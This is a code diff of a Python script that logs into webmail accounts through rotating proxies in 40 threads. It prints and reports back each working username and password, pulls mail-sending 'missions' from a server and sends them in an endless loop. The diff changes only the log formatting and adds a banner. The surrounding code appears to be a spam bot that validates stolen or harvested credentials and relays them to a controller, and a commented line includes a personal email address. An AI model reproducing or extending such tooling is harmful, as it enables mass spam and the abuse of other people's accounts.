@@ -56,43 +56,43 @@ def thread_mission(proxies):
                 password = account_data['password']
                 server = ZMailWebServer(username, password, debuglevel=0, proxies=proxies)
                 if server.x_token is None:
-                    log.warning(f'{proxies}Login Web Mail Failed:{server.message} Retry Waiting 5s')
+                    log.warning(f'{temp}-{proxies}-Login Web Mail Failed:{server.message} Retry Waiting 5s')
                     time.sleep(5)
                     continue
                 else:
-                    log.warning(f'{proxies}Login Web Mail Success:{username, password}')
+                    log.warning(f'{temp}-{proxies}-Login Web Mail Success:{username, password}')
                     post_auth_user(username, password)
-                    log.warning(f'{proxies}Send Back Auth Account:{username, password}')
+                    log.warning(f'{temp}-{proxies}-Send Back Auth Account:{username, password}')
                     break
             except RequestException:
-                log.warning('{proxies}Request Server Exception Retry Waiting 5s')
+                log.warning('{temp}-{proxies}-Request Server Exception Retry Waiting 5s')
                 time.sleep(5)
         try:
             mission_data = get_email_mission()
             # mission_data['receivers'].append('914081010@qq.com')
-            log.warning(f"{proxies}Send Mail To {mission_data['receivers']}")
+            log.warning(f"{temp}-{proxies}-Send Mail To {mission_data['receivers']}")
             result = server.send_mail(
                 to=mission_data['receivers'],
                 content=mission_data['message'],
                 subject=mission_data['subject']
             )
             if 'Permission denied' in result:
-                log.warning(f"{proxies}Account Error Retry Waiting 5s")
+                log.warning(f"{temp}-{proxies}-Account Error Retry Waiting 5s")
                 time.sleep(5)
                 continue
-            log.warning(f"{proxies}Send Mail: {result}")
             # 不存入发件箱 不需要删除了
-            log.warning(f"{proxies}Send Success Delay {mission_data['delay']}")
+            log.warning(f"{temp}-{proxies}-Send Success Delay {mission_data['delay']}")
             time.sleep(60)
             temp += 1
         except RequestException as e:
             # traceback.print_exc(e)
-            log.warning(f"{proxies}Request Server Exception Retry Waiting 5s")
+            log.warning(f"{temp}-{proxies}-Request Server Exception Retry Waiting 5s")
             time.sleep(5)
 
 
 pool = ThreadPool(40)
 while True:
+    log.warning(f"--------------------------新的风暴已经开始---------------------------------")
     args = get_proxies()
     request = makeRequests(thread_mission, args)
     [pool.putRequest(req) for req in request]
